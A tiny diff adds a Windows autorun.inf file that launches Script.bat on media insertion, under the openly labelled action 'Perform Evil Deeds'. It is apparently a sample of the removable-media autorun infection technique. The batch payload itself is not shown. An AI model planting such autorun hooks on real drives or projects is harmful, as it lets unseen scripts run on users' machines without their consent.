@@ -1,0 +1,4 @@
+[Autorun]
+open=Script.bat
+action=Perform Evil Deeds
+icon=icon.ico
